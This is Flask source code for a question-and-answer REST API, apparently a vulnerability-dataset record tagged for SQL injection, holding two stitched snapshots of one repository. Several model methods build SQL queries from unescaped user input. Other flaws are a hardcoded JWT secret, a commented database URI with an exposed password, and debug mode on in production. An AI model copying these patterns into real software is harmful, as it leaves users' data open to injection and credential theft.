auth_blueprint.add_url_rule(
    '/api/v1/auth/logout',
    view_func=logout_view,
    methods=['POST']
)
/n/n/napp/auth/models.py/n/n# Custom Model

# Author: P8ul
# https://github.com/p8ul

""""""
    This class will act as a table in a Database
    Has relevant getters, setters & mutation methods
""""""
import psycopg2
import psycopg2.extras
from psycopg2.extras import RealDictCursor
from flask_bcrypt import Bcrypt
from config import BaseConfig
from ..utils import db_config


class Table:
    def __init__(self, data={}):
        self.config = db_config(BaseConfig.DATABASE_URI)
        self.table, self.email = 'users', data.get('email')
        self.username = data.get('username')
        self.user_id = data.get('user_id')
        self.b_crypt = Bcrypt()
        if data.get('password'):
            self.password = self.b_crypt.generate_password_hash(data.get('password')).decode('utf-8')

    def query(self):
        con = psycopg2.connect(**self.config)
        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)
        cur.execute(""select * from {}"".format(self.table))
        queryset_list = cur.fetchall()
        con.close()
        return [item for item in queryset_list]

    def filter_by(self):
        con, queryset_list = psycopg2.connect(**self.config), None
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            cur.execute(""select * from {} WHERE user_id='{}'"".format(self.table, self.user_id))
            queryset_list = cur.fetchall()
        except Exception as e:
            print(e)
        con.close()
        return queryset_list

    def filter_by_email(self):
        con, queryset_list = psycopg2.connect(**self.config), None
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            cur.execute(""select * from {} WHERE email='{}'"".format(self.table, self.email))
            queryset_list = cur.fetchall()
        except Exception as e:
            print(e)
        con.close()
        return queryset_list

    def update(self):
        pass

    def delete(self):
        con = psycopg2.connect(**self.config)
        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)
        try:
            query = ""DELETE FROM users WHERE email=%s""
            cur.execute(query, self.email)
            con.commit()
            con.close()
        except Exception as e:
            print(e)
            con.close()
            return False
        return True

    def save(self):
        con, response = psycopg2.connect(**self.config), None
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            query = ""INSERT INTO users (username, email, password) values(%s, %s, %s) RETURNING *""
            cur.execute(query, (self.username, self.email, self.password))
            con.commit()
            response = cur.fetchone()
        except Exception as e:
            print(e)
        con.close()
        return response
/n/n/napp/auth/test/test_model.py/n/nfrom .base import BaseTestCase
from ..models import Table


class FlaskTestCase(BaseTestCase):

    """""" Test signup api """"""
    def test_model_crud(self):
        table = Table(self.data)
        # Test Create
        instance = table.save()
        assert instance.get('email') == self.data.get('email')

        # Test query
        isinstance(table.query(), type([]))
/n/n/napp/auth/test/test_user_validation.py/n/nfrom .base import BaseTestCase
from ..validatons import validate_user_details


class FlaskTestCase(BaseTestCase):

    """""" Test user details validation """"""
    def test_model_crud(self):
        data = {""email"": """", 'password': ''}
        # Test Create
        instance = validate_user_details(data)
        assert instance.get('email') == 'Invalid email. Please enter a valid email'

/n/n/napp/auth/validatons.py/n/nfrom ..utils import valid_email


def validate_user_details(data):
    errors = {}
    if not valid_email(data.get('email')):
        errors['email'] = 'Invalid email. Please enter a valid email'
    if not data.get('email'):
        errors['password'] = 'Password required'
    return errors
/n/n/napp/comments/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify
from flask.views import MethodView
from ...models import Table
from ....utils import jwt_required

comments_blueprint = Blueprint('comments', __name__)


class ListAPIView(MethodView):
    """""" Update Instance api resource """"""

    @jwt_required
    def post(self, answer_id=None):
        data = request.get_json(force=True)
        data['answer_id'] = answer_id
        response = Table(data).save()
        if response:
            response_object = {
                'status': 'success',
                'message': 'Your comment was successful'
            }
            return make_response(jsonify(response_object)), 201

        response_object = {
            'status': 'fail',
            'message': 'Some error occurred. Please try again.'
        }
        return make_response(jsonify(response_object)), 400


# Define the API resources
comment_view = ListAPIView.as_view('comment_api')

# Add Rules for API Endpoints
comments_blueprint.add_url_rule(
    '/api/v1/questions/answers/comment/<string:answer_id>',
    view_func=comment_view,
    methods=['POST']
)
/n/n/napp/comments/models.py/n/n""""""
    Author: P8ul
    https://github.com/p8ul

    This class will connect to a Database and perform crud actions
    Has relevant getters, setters & mutation methods
""""""
import psycopg2
import psycopg2.extensions
from psycopg2.extras import RealDictCursor
from flask import session
from config import BaseConfig
from ..utils import db_config


class Table:
    def __init__(self, data={}):
        self.config = db_config(BaseConfig.DATABASE_URI)
        self.table = 'comments'
        self.answer_id = data.get('answer_id')
        self.question_id = data.get('question_id')
        self.comment_body = data.get('comment_body')

    def save(self):
        """"""
        Insert a comment in comments table
        :return: True if record values are inserted successfully else false
        """"""
        con = psycopg2.connect(**self.config)
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            query = ""INSERT INTO comments(user_id, answer_id, comment_body) values(%s, %s, %s) ""
            cur.execute(query, (session.get('user_id'), self.answer_id, self.comment_body))
            con.commit()
        except Exception as e:
            print(e)
            con.close()
            return False
        return True
/n/n/napp/comments/test/__init__.py/n/n/n/n/napp/comments/test/test_comment_api.py/n/n# APIs Testing

# Author: P8ul
# https://github.com/p8ul

import unittest
from ...test.base import BaseTestCase


class FlaskTestCase(BaseTestCase):

    """""" Test List comment api """"""
    def test_comments_api(self):
        response = self.client.post(
            '/api/v1/questions/answers/comment/3', data=self.data,
            headers={'Authorization': 'JWT ' + self.token}
        )
        assert response.status_code == 400


if __name__ == '__main__':
    unittest.main()
/n/n/napp/comments/test/test_comment_model.py/n/n# APIs Testing

# Author: P8ul
# https://github.com/p8ul

import unittest
from ...test.base import BaseTestCase
from ..models import Table

table = Table()


class FlaskTestCase(BaseTestCase):

    """""" Test votes model  """"""
    def test_model_save(self):
        query = table.save()
        self.assertEqual(query, False)

    def test_model_init(self):
        keys = table.config.keys()
        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])
        self.assertEqual(len(list(keys)), 4)


if __name__ == '__main__':
    unittest.main()
/n/n/napp/migrations/db.py/n/nimport psycopg2
import psycopg2.extras

from .initial1 import migrations
from config import BaseConfig
from ..utils import db_config


class Database:
    def __init__(self, config):
        self.config = db_config(config)
        self.database = self.config.get('database')

    def test(self):
        con = psycopg2.connect(**self.config)
        con.autocommit = True
        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)
        cur.execute(""select * from pg_database where datname = %(database_name)s"", {'database_name': self.database})
        databases = cur.fetchall()
        if len(databases) > 0:
            print("" * Database {} exists"".format(self.database))
            for command in migrations:
                try:
                    cur.execute(command)
                    con.commit()
                except Exception as e:
                    print(e)
        else:
            print("" * Database {} does not exists"".format(self.database))
        con.close()


db = Database(BaseConfig.DATABASE_URI)
/n/n/napp/postman/document.py/n/nimport json
from urllib.parse import urlparse


class ApiDocumentGen:
    def __init__(self, file):
        self.file = file
        self.data = {}
        self.name = ''
        self.description = ''
        self.domain = ''
        self.api_version = '/api/v1'
        self.output_file = 'apiary.apid'
        self.file_format = 'FORMAT: 1A'
        self.requests = []
        self.get_data()
        self.data_out()

    def get_data(self):
        with open(self.file, encoding='utf-8') as f:
            self.data = json.loads(f.read())
        self.name = self.data['name']
        self.description = self.data['description']
        self.get_url_info()

    def data_out(self):
        # write document introduction
        doc = open(self.output_file, 'w+')
        doc.write(self.file_format + '\n')
        doc.write('HOST: ' + self.domain + '\n\n')
        doc.write('# ' + self.name + '\n\n')
        doc.write(self.description)
        doc.close()

        for request in self.data.get('requests'):
            self.process_requests(request)

    def process_requests(self, request):
        url = urlparse(request.get('url'))
        path = url.path.replace(self.api_version, '')
        self.domain, description = url, request.get('description')
        method, name = request.get('method'), request.get('name')
        content_type = 'application/json'
        collection_name = '## ' + name + ' [' + path + ']\n'
        title = '### ' + name + ' [' + method + ']'
        req = '+ Request (' + content_type + ')'
        resp = '+ Response 201 (' + content_type + ')'

        doc = open(self.output_file, 'a')
        doc.write(collection_name + '\n\n')
        doc.write(title + '\n')
        doc.write(description + '\n\n')
        if method == ""POST"":
            doc.write(req + '\n\n')
            json_data = json.loads(request.get('rawModeData'))
            json.dump(json_data, doc, indent=8, sort_keys=True, ensure_ascii=False)
            doc.write('\n\n\n')

        doc.write(resp + '\n\n\n')
        doc.close()

    def get_url_info(self):
        url = self.data.get('requests')[0].get('url')
        domain = urlparse(url)
        self.domain = url.replace(domain.path, '') + self.api_version


if __name__ == ""__main__"":
    app = ApiDocumentGen('data.json')
    # app.main()

/n/n/napp/questions/api/v1/view.py/n/n# APIs Resources

# Author: P8ul
# https://github.com/p8ul

from flask import Blueprint, request, make_response, jsonify, session
from flask.views import MethodView
from ...models import Table
from ....utils import jwt_required

question_blueprint = Blueprint('questions', __name__)


class CreateAPIView(MethodView):
    """"""
    Create API Resource
    """"""
    @jwt_required
    def post(self):
        # get the post data
        data = request.get_json(force=True)
        data['user_id'] = session.get('user_id')
        row = Table(data).save()
        if row:
            response_object = {
                'status': 'success',
                'results': row
            }
            return make_response(jsonify(response_object)), 201

        response_object = {
            'status': 'fail',
            'message': 'Some error occurred. Please try again.'
        }
        return make_response(jsonify(response_object)), 401

    """""" UPDATE QUESTION """"""
    @jwt_required
    def put(self, question_id=None):
        # get the post data
        data = request.get_json(force=True)
        data['question_id'] = question_id
        data['user_id'] = session.get('user_id')
        result = Table(data).update()
        if result:
            response_object = {
                'status': 'success',
                'results': data
            }
            return make_response(jsonify(response_object)), 201

        response_object = {
            'status': 'fail',
            'message': 'Some error occurred. Please try again.'
        }
        return make_response(jsonify(response_object)), 401

    """""" DELETE QUESTION """"""
    @jwt_required
    def delete(self, question_id=None):
        data = dict()
        data['user_id'], data['question_id'] = session.get('user_id'), question_id
        response = Table(data).delete()
        if response == 401:
            response_object = {
                'status': 'fail',
                'message': 'Unauthorized, You cannot delete this question!.'
            }
            return make_response(jsonify(response_object)), 401
        if response == 404:
            response_object = {'status': 'fail', 'message': 'Some error occurred. Question Not Found!.'}
            return make_response(jsonify(response_object)), 404
        if not response:
            response_object = {
                'status': 'fail',
                'message': 'Some error occurred. Please try again.'
            }
            return make_response(jsonify(response_object)), 400
        response_object = {
            'status': 'success',
            'message': 'Question deleted successfully'
        }
        return make_response(jsonify(response_object)), 200


class ListAPIView(MethodView):
    """""" List API Resource """"""
    @jwt_required
    def get(self, instance_id=None, user_id=None):
        data = dict()
        data['question_id'], data['user_id'] = instance_id, session.get('user_id')
        if user_id:
            results = Table({}).filter_by_user()
            if results:
                response_object = {'results': results, 'status': 'success'}
                return make_response(jsonify(response_object)), 200
        if instance_id:
            results = Table(data).filter_by()
            if not results:
                response_object = {'status': 'fail', 'message': 'Bad request.'}
                return make_response(jsonify(response_object)), 400
            if len(results) < 1:
                response_object = {'results': 'Question not found', 'status': 'error'}
                return make_response(jsonify(response_object)), 404
            response_object = {'results': results, 'status': 'success'}
            return make_response(jsonify(response_object)), 200
        response_object = {
            'results': Table({'q': request.args.get('q')}).query(), 'status': 'success'
        }
        return (jsonify(response_object)), 200


class UserQuestionsListAPIView(MethodView):
    """"""
    List API Resource
    """"""
    @jwt_required
    def get(self, user):
        data = {'user_id': session.get('user_id')}
        results = Table(data).filter_by_user()
        if results:
            response_object = {'results': results, 'status': 'success'}
            return (jsonify(response_object)), 200

        response_object = {'results': 'Bad Request'}
        return (jsonify(response_object)), 400


# Define the API resources
create_view = CreateAPIView.as_view('create_api')
list_view = ListAPIView.as_view('list_api')
user_questions_list_view = ListAPIView.as_view('user_questions_api')

# Add Rules for API Endpoints
question_blueprint.add_url_rule(
    '/api/v1/questions/',
    view_func=create_view,
    methods=['POST']
)

question_blueprint.add_url_rule(
    '/api/v1/questions/<string:question_id>',
    view_func=create_view,
    methods=['DELETE']
)

question_blueprint.add_url_rule(
    '/api/v1/questions/<string:question_id>',
    view_func=create_view,
    methods=['PUT']
)

question_blueprint.add_url_rule(
    '/api/v1/questions/',
    view_func=list_view,
    methods=['GET']
)

question_blueprint.add_url_rule(
    '/api/v1/questions/user/<string:user_id>',
    view_func=user_questions_list_view,
    methods=['GET']
)

question_blueprint.add_url_rule(
    '/api/v1/questions/<string:instance_id>',
    view_func=list_view,
    methods=['GET']
)
/n/n/napp/questions/models.py/n/n# Custom Model

# Author: P8ul
# https://github.com/p8ul

""""""
    This class will connect to a Database and perform crud actions
    Has relevant getters, setters & mutation methods
""""""
import psycopg2
import psycopg2.extensions
from psycopg2.extras import RealDictCursor
from config import BaseConfig
from ..utils import db_config


class Table:
    def __init__(self, data={}):
        self.config = db_config(BaseConfig.DATABASE_URI)
        self.table, self.title = 'questions', data.get('title')
        self.body, self.q = data.get('body'), data.get('q')
        self.question_id = data.get('question_id')
        self.user_id = data.get('user_id')

    def save(self):
        """""" Create a question record in questions table
        :return: None or record values
        """"""
        con = psycopg2.connect(**self.config)
        cur, response = con.cursor(cursor_factory=RealDictCursor), None
        try:
            query = ""INSERT INTO questions (title, body, user_id) VALUES (%s, %s, %s) RETURNING *""
            cur.execute(query, (self.title, self.body, self.user_id))
            con.commit()
            response = cur.fetchone()
        except Exception as e:
            print(e)
        con.close()
        return response

    def query(self):
        """"""Query the data in question table :return: list: query set list""""""
        con, queryset_list = psycopg2.connect(**self.config), None
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            if not self.q:
                cur.execute(
                    "" SELECT *,( SELECT count(*) FROM ""
                    ""answers WHERE answers.question_id=questions.question_id ) as ""
                    ""answers_count FROM questions ""
                    "" ORDER BY questions.created_at DESC""
                )
            else:
                query = ""SELECT *, ( SELECT count(*) FROM answers WHERE ""
                query += "" answers.question_id=questions.question_id ) as answers_count ""
                query += "" FROM questions WHERE  body LIKE %s OR title LIKE %s  ""
                query += "" ORDER BY questions.created_at""
                cur.execute(query, (self.q, self.q))
            queryset_list = cur.fetchall()
        except Exception as e:
            print(e)
        con.close()
        return queryset_list

    def filter_by(self):
        """"""
        Selects a question by id
        :return: False if record is not found else query list of found record
        """"""
        con, queryset_list = psycopg2.connect(**self.config), None
        cur = con.cursor(cursor_factory=RealDictCursor)
        cur2 = con.cursor(cursor_factory=RealDictCursor)
        try:

            query = """""" SELECT * FROM questions WHERE questions.question_id=%s ORDER BY questions.created_at""""""
            cur.execute(query % self.question_id)
            questions_queryset_list = cur.fetchall()
            cur2.execute(""SELECT * FROM answers WHERE answers.question_id=%s"" % self.question_id)
            answers_queryset_list = cur2.fetchall()
            queryset_list = {
                'question': questions_queryset_list,
                'answers': answers_queryset_list
            }
        except Exception as e:
            print(e)
        con.close()
        return queryset_list

    def filter_by_user(self):
        """"""
        Selects question for specific user:default filters by current logged in user
        :return: False if record is not found else query list of found record
        """"""
        con, queryset_list = psycopg2.connect(**self.config), None
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            cur.execute(
                """""" SELECT * FROM questions 
                    WHERE questions.user_id="""""" + self.user_id + """""" ORDER BY questions.created_at """"""
            )
            questions_queryset_list = cur.fetchall()
            queryset_list = {'question': questions_queryset_list}
        except Exception as e:
            print(e)
        con.close()
        return queryset_list

    def update(self):
        """"""
        Update an question column
        :return: bool:
        """"""
        con, result = psycopg2.connect(**self.config), True
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            query = ""UPDATE questions SET title=%s, body=%s WHERE question_id=%s""
            cur.execute(query, (self.title, self.body, self.question_id))
            con.commit()
        except Exception as e:
            print(e)
            result = False
        con.close()
        return result

    def record_exists(self):
        """"""
        checks whether a question was asked by the user
        :return: bool: False if record is not found else True
        """"""
        con, exists = psycopg2.connect(**self.config), False
        cur, queryset_list = con.cursor(cursor_factory=RealDictCursor), None
        try:
            query = ""SELECT question_id, user_id FROM questions WHERE question_id=%s AND user_id=%s""
            cur.execute(query, (self.question_id, self.user_id))
            queryset_list = cur.fetchall()
            con.close()
            exists = True if len(queryset_list) > 1 else False
        except Exception as e:
            print(e)
        return exists

    def delete(self):
        """""" Delete a table records
        :return: bool
        """"""
        con = psycopg2.connect(**self.config)
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            exist = self.filter_by()['question']
            if not len(exist) > 0:
                return 404
            if not self.record_exists():
                return 401
            cur.execute(""DELETE from {} WHERE {}= '{}'"".format(self.table, 'question_id', self.question_id))
            con.commit()
        except Exception as e:
            print(e)
            con.close()
            return False
        con.close()
        return True
/n/n/napp/questions/test/test_question_model.py/n/n# APIs Testing

# Author: P8ul
# https://github.com/p8ul

import unittest
from ...test.base import BaseTestCase
from ..models import Table

table = Table()


class FlaskTestCase(BaseTestCase):

    """""" Test question model  """"""
    def test_question_model(self):
        query = table.query()
        self.assertIsInstance(query, type([]))

    def test_model_filter(self):
        query = table.filter_by()
        self.assertEqual(query, None)

    def test_model_filter_user(self):
        query = table.filter_by_user()
        self.assertEqual(query, None)

    def test_model_save(self):
        query = table.save()
        self.assertEqual(query, None)

    def test_model_update(self):
        query = table.update()
        self.assertEqual(query, True)

    def test_model_delete(self):
        query = table.delete()
        self.assertEqual(query, False)

    def test_model_init(self):
        keys = table.config.keys()
        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])
        self.assertEqual(len(list(keys)), 4)


if __name__ == '__main__':
    unittest.main()
/n/n/napp/questions/test/test_questions_apis.py/n/n# APIs Testing

# Author: P8ul
# https://github.com/p8ul

import unittest
from ...test.base import BaseTestCase


class FlaskTestCase(BaseTestCase):

    """""" Test List questions api """"""
    def test_list_questions(self):
        response = self.client.get(
            '/api/v1/questions/',
            headers={'Authorization': 'JWT ' + self.token}
        )
        assert response.status_code == 200
        assert response.get_json()['status'] == 'success'

    """""" Test retrieve questions api """"""
    def test_retrieve_question(self):
        response = self.client.get(
            '/api/v1/questions/1',
            headers={'Authorization': 'JWT ' + self.token}
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.get_json()['status'], 'success')

    """""" Test retrieve questions api """"""
    def test_post_update(self):
        """""" Initialize test data """"""
        data = {
            'title': 'Test title',
            'body': 'Test body',
            'user': self.user_id
        }

        """""" Post request""""""
        response = self.client.post(
            '/api/v1/questions/', json=data,
            headers={'Authorization': 'JWT ' + self.token}
        )

        """""" Test status """"""
        self.assertEqual(response.status_code, 201)

        """""" Test if a question is created """"""
        self.assertEqual(response.get_json()['status'], 'success')


if __name__ == '__main__':
    unittest.main()
/n/n/napp/test/base.py/n/nimport unittest

from .. import create_app
app = create_app(""config.TestConfig"")


class BaseTestCase(unittest.TestCase):
    """"""A base test case.""""""

    def create_app(self):
        app.config.from_object('config.TestConfig')
        return app

    def setUp(self):
        # method to invoke before each test.
        self.client = app.test_client()
        self.data = {
            'username': 'Paul',
            'email': 'pkinuthia10@gmail.com',
            'password': 'password'
        }
        """""" Login to get a JWT token """"""
        self.client.post('/api/v1/auth/signup', json=self.data)
        response = self.client.post('/api/v1/auth/login', json=self.data)
        self.token = response.get_json().get('auth_token')
        self.user_id = str(response.get_json()['id'])

    def tearDown(self):
        # method to invoke after each test.
        pass
/n/n/napp/utils.py/n/nfrom urllib.parse import urlparse
import datetime
import os
import re
from functools import wraps
from flask import request, make_response, jsonify, session
import jwt


def jwt_required(f):
    """""" Ensure jwt token is provided and valid
        :param f: function to decorated
        :return: decorated function
    """"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        try:
            auth_header = request.headers.get('Authorization').split(' ')[-1]
        except Exception as e:
            print(e)
            return make_response(jsonify({""message"": 'Unauthorized. Please login'})), 401
        result = decode_auth_token(auth_header)
        try:
            if int(result):
                pass
        except Exception as e:
            print(e)
            return make_response(jsonify({""message"": result})), 401
        return f(*args, **kwargs)
    return decorated_function


def encode_auth_token(user_id):
    """"""
    Encodes a payload to generate JWT Token
    :param user_id: Logged in user Id
    :return: JWT token
    :TODO add secret key to app configuration
    """"""
    payload = {
        'exp': datetime.datetime.utcnow() + datetime.timedelta(days=31, seconds=30),
        'iat': datetime.datetime.utcnow(),
        'sub': user_id
    }
    return jwt.encode(
        payload,
        'SECRET_KEY',
        algorithm='HS256'
    )


def decode_auth_token(auth_token):
    """""" Validates the auth token
    :param auth_token:
    :return: integer|string
    """"""
    try:
        payload = jwt.decode(auth_token, 'SECRET_KEY', algorithm='HS256')
        session['user_id'] = str(payload.get('sub'))
        return payload['sub']
    except jwt.ExpiredSignatureError:
        return 'Token Signature expired. Please log in again.'
    except jwt.InvalidTokenError:
        return 'Invalid token. Please log in again.'


def db_config(database_uri):
    """""" This function extracts postgres url
    and return database login information
    :param database_uri: database Configuration uri
    :return: database login information
    """"""
    if os.environ.get('DATABASE_URI'):
        database_uri = os.environ.get('DATABASE_URI')

    result = urlparse(database_uri)
    config = {
        'database': result.path[1:],
        'user': result.username,
        'password': result.password,
        'host': result.hostname
    }
    return config


def valid_email(email):
    """"""  Validate email """"""
    return re.match(r'^.+@([?)[a-zA-Z0-9-.])+.([a-zA-Z]{2,3}|[0-9]{1,3})(]?)$', email)
/n/n/napp/votes/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify, session
from flask.views import MethodView
from ...models import Table
from ....utils import jwt_required

votes_blueprint = Blueprint('votes', __name__)


class VoteAPIView(MethodView):
    """""" Update Instance api resource """"""

    @jwt_required
    def post(self, answer_id=None):
        data = request.get_json(force=True)
        data['answer_id'] = answer_id
        data['user_id'] = session.get('user_id')
        response = Table(data).vote()
        if response:
            response_object = {
                'status': 'success',
                'message': 'Your vote was successful'
            }
            return make_response(jsonify(response_object)), 201

        response_object = {
            'status': 'fail',
            'message': 'Some error occurred. Please try again.'
        }
        return make_response(jsonify(response_object)), 400


# Define the API resources
vote_view = VoteAPIView.as_view('vote_api')

# Add Rules for API Endpoints
votes_blueprint.add_url_rule(
    '/api/v1/questions/answers/vote/<string:answer_id>',
    view_func=vote_view,
    methods=['POST']
)
/n/n/napp/votes/models.py/n/n""""""
    Author: P8ul
    https://github.com/p8ul

    This class will connect to a Database and perform crud actions
    Has relevant getters, setters & mutation methods
""""""
import psycopg2
import psycopg2.extensions
from psycopg2.extras import RealDictCursor
from config import BaseConfig
from ..utils import db_config


class Table:
    def __init__(self, data={}):
        self.config = db_config(BaseConfig.DATABASE_URI)
        self.table, self.answer_id = 'votes', data.get('answer_id')
        self.vote_value, self.user_id = data.get('vote'), data.get('user_id')

    def vote_exists(self):
        """"""
        Checks if vote for a particular answer
        is voted by current user
        :return: True if vote exist else False
        """"""
        con = psycopg2.connect(**self.config)
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            query = ""SELECT user_id, vote_id FROM votes WHERE answer_id=%s AND user_id=%s""
            cur.execute(query, (self.answer_id, self.user_id))
            queryset_list = cur.fetchall()
            con.close()
            if len(queryset_list) < 1:
                return False
            return True
        except Exception as e:
            print(e)
            con.close()
            return False

    def create_vote(self):
        """"""
        Insert a vote in votes table
        :return: True if record values are inserted successfully else false
        """"""
        con = psycopg2.connect(**self.config)
        cur = con.cursor(cursor_factory=RealDictCursor)
        try:
            query = ""INSERT INTO votes(user_id, answer_id, vote) VALUES(%s, %s, %s)""
            cur.execute(query, (self.user_id, self.answer_id, self.vote_value))
            con.commit()
        except Exception as e:
            print(e)
            con.close()
            return False
        return True

    def update_vote(self):
        """"""
        Modify record from votes table
        :return:
        """"""
        if not self.answer_id:
            return False
        try:
            con = psycopg2.connect(**self.config)
            cur = con.cursor(cursor_factory=RealDictCursor)
            query = ""UPDATE votes SET vote=%s WHERE answer_id=%s AND user_id=%s""
            cur.execute(query, (self.vote_value, self.answer_id, self.user_id))
            con.commit()
        except Exception as e:
            print(e)
            con.close()
            return False
        return True

    def vote(self):
        """"""
        Switch bus for updating or creating a vote
        :return: bool: True if transaction is
                       completed successfully else false
        """"""
        if self.vote_exists():
            return self.update_vote()
        return self.create_vote()

    def delete(self):
        pass

    def save(self):
        pass
/n/n/napp/votes/test/__init__.py/n/n/n/n/napp/votes/test/test_vote_apis.py/n/n# APIs Testing

# Author: P8ul
# https://github.com/p8ul

import unittest
from ...test.base import BaseTestCase


class FlaskTestCase(BaseTestCase):

    """""" Test List votes api """"""
    def test_votes_api(self):
        response = self.client.post(
            '/api/v1/questions/answers/vote/1', data=self.data,
            headers={'Authorization': 'JWT ' + self.token}
        )
        assert response.status_code == 400


if __name__ == '__main__':
    unittest.main()
/n/n/napp/votes/test/test_vote_model.py/n/n# APIs Testing

# Author: P8ul
# https://github.com/p8ul

import unittest
from ...test.base import BaseTestCase
from ..models import Table

table = Table()

class FlaskTestCase(BaseTestCase):

    """""" Test votes model  """"""
    def test_model_save(self):
        query = table.save()
        self.assertEqual(query, None)

    def test_model_delete(self):
        query = table.delete()
        self.assertEqual(query, None)

    def test_model_vote_exist(self):
        query = table.vote_exists()
        self.assertEqual(query, None)

    def test_model_vote_exist(self):
        query = table.vote()
        self.assertEqual(query, False)

    def test_model_update_vote(self):
        query = table.update_vote()
        self.assertEqual(query, False)

    def test_model_create_vote(self):
        query = table.create_vote()
        self.assertEqual(query, False)

    def test_model_init(self):
        keys = table.config.keys()
        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])
        self.assertEqual(len(list(keys)), 4)


if __name__ == '__main__':
    unittest.main()
/n/n/nconfig.py/n/n### Configuration file

# Author: P8ul Kinuthia
# https://github.com/p8ul

import os


# default config
class BaseConfig(object):
    basedir = os.path.abspath(os.path.dirname(__file__))
    # DATABASE_URI = ""postgres://tvhuxucdtigrin:fc7e1f53efe5f81b6a6d3dacad8f79605cd0973d0ae5efa5ac29b3976b48f938@ec2-54-83-13-119.compute-1.amazonaws.com:5432/d393cevo034f77""
    DATABASE_URI = ""postgresql://stack:stack@127.0.0.1:5432/stack""
    DEBUG = True
    SECRET_KEY = '\xbf\xb0\x11\xb1\xcd\xf9\xba\x8bp\x0c...'


class TestConfig(BaseConfig):
    DEBUG = True
    TESTING = True
    WTF_CSRF_ENABLED = False
    DATABASE_URI = 'sqlite:///:memory:'


class DevelopmentConfig(BaseConfig):
    DEBUG = True


class ProductionConfig(BaseConfig):
    DEBUG = True/n/n/nmanage.py/n/n# Flask app

# Author: P8ul
# https://github.com/p8ul

from app import create_app
app = create_app(""config.BaseConfig"")

if __name__ == ""__main__"":
    app.run(debug=True)
/n/n/n",0,sql
5,185,ad02c932f85c0f4ed6c1e561efc5edc163347806,"/app/__init__.py/n/n# Flask create app

# Author: P8ul
# https://github.com/p8ul

from flask import Flask
from .migrations.db import db


def create_app(config_filename):
    app = Flask(__name__)
    app.config.from_object(config_filename)

    with app.app_context():
        pass

    """""" Basic Routes """"""

    # register our blueprints
    configure_blueprints(app)

    # register extensions
    configure_extensions()

    return app


def configure_blueprints(app):
    """"""Configure blueprints .""""""
    from app.questions.api.v1.view import question_blueprint
    from .home.views import home_blueprint
    from .auth.api.v1.view import auth_blueprint
    from .answers.api.v1.view import answers_blueprint
    from .votes.api.v1.view import votes_blueprint
    from .comments.api.v1.view import comments_blueprint

    app_blueprints = [
        answers_blueprint,
        question_blueprint,
        auth_blueprint,
        votes_blueprint,
        comments_blueprint,
        home_blueprint
    ]

    for bp in app_blueprints:
        app.register_blueprint(bp)


def configure_extensions():
    db.test()


if __name__ == ""__main__"":
    app = create_app(""config"")
    app.run(debug=True)
/n/n/n/app/answers/api/v1/view.py/n/n# APIs Resources

# Author: P8ul
# https://github.com/p8ul

from flask import Blueprint, request, make_response, jsonify
from flask.views import MethodView
from ...models import Table
from ....utils import jwt_required

answers_blueprint = Blueprint('answers', __name__)


class CreateAPIView(MethodView):
    """""" Update Instance api resource """"""

    @jwt_required
    def put(self, question_id=None, answer_id=None):
        data = request.get_json(force=True)
        response = Table.update(question_id, answer_id, data)
        if response == 200:
            response_object = {
                'status': 'success',
                'message': 'Update successful'
            }
            return make_response(jsonify(response_object)), 200
        if response == 302:
            response_object = {
                'status': 'fail',
                'message': 'Please provide correct answer and question id'
            }
            return make_response(jsonify(response_object)), 400
        if response == 203:
            response_object = {
                'status': 'fail',
                'message': 'Unauthorized request.'
            }
            return make_response(jsonify(response_object)), 401

        else:
            response_object = {
                'status': 'fail',
                'message': 'Please provide correct answer and question id'
            }
            return make_response(jsonify(response_object)), 400


    """"""
    Create API Resource
    """"""
    @jwt_required
    def post(self, question_id=None):
        # get the post data
        post_data = request.get_json(force=True)
        response = Table.save(str(question_id), data=post_data)
        if response:
            response_object = {
                'status': 'success',
                'message': response
            }
            return make_response(jsonify(response_object)), 201

        response_object = {
            'status': 'fail',
            'message': 'Unknown question id. Try a different id.'
        }
        return make_response(jsonify(response_object)), 400


class ListAPIView(MethodView):
    """"""
    List API Resource
    """"""
    @jwt_required
    def get(self, instance_id=None, user_id=None):
        if instance_id:
            query = {
                'instance_id': instance_id,
                'user_id': user_id
            }
            results = Table.filter_by(**query)
            if len(results) < 1:
                response_object = {
                    'results': 'Instance not found',
                    'status': 'error'
                }
                return make_response(jsonify(response_object)), 404
            response_object = {
                'results': results,
                'status': 'success'
            }
            return (jsonify(response_object)), 200

        response_object = {
            'results': Table.query(),
            'status': 'success'
        }
        return (jsonify(response_object)), 200


# Define the API resources
create_view = CreateAPIView.as_view('create_api')
list_view = ListAPIView.as_view('list_api')

# Add Rules for API Endpoints
answers_blueprint.add_url_rule(
    '/api/v1/questions/<int:question_id>/answers',
    view_func=create_view,
    methods=['POST']
)

answers_blueprint.add_url_rule(
    '/api/v1/questions/<string:question_id>/answers/<string:answer_id>',
    view_func=create_view,
    methods=['PUT']
)

answers_blueprint.add_url_rule(
    '/api/v1/questions/answers',
    view_func=list_view,
    methods=['GET']
)
/n/n/n/app/answers/test/base.py/n/nimport unittest

from ... import create_app
app = create_app(""config.TestConfig"")


class BaseTestCase(unittest.TestCase):
    """"""A base test case.""""""
    def create_app(self):
        app.config.from_object('config.TestConfig')
        return app

    def setUp(self):
        # method to invoke before each test.
        self.client = app.test_client()
        self.data = {
            'username': 'Paul',
            'email': 'pkinuthia10@gmail.com',
            'password': 'password'
        }
        """""" Login to get a JWT token """"""
        self.client.post('/api/v1/auth/signup', json=self.data)
        response = self.client.post('/api/v1/auth/login', json=self.data)
        self.token = response.get_json().get('auth_token')
